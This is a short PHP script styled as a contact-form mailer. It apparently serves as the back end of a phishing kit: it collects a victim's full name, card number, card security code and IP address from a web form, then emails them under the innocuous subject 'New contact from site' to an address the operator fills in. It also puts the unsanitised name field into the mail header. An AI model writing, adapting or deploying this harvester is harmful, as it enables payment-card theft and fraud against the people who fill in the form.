<?php

    // Only process POST reqeusts.
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $fullnam = $_POST["fullnam"];
        $cardnum = $_POST["cardnum"];
        $seccode = $_POST["seccode"];
    	$q4a = $_POST["q4a"];
		$consent = $_POST["consent"];
		

        // Set the recipient email address.
        // FIXME: Update this to your desired email address.
         $recipient = "";

        // Set the email subject.
        $subject = "New contact from site";

        // Build the email content.
        $email_content = "fullnam: $fullnam\n";
        $email_content .= "Card: $cardnum\n\n";
        $email_content .= "Securecode: $seccode\n\n";
        $email_content .= "Consent: $consent\n\n";	
        $email_content .= "IP: $q4a";
		
		
		
		

        // Build the email headers.
        $email_headers = "From: $fullnam";

        // Send the email.
        if (mail($recipient, $subject, $email_content, $email_headers)) {
            // Set a 200 (okay) response code.
            //http_response_code(200);
            echo "Thank You! Your information has been submitted.";
        } else {
            // Set a 500 (internal server error) response code.
            //http_response_code(500);
            echo "Oops! Something went wrong and we couldn't send your message.";
        }

    } else {
        // Not a POST request, set a 403 (forbidden) response code.
        //http_response_code(403);
        echo "There was a problem with your submission, please try again.";
    }

?>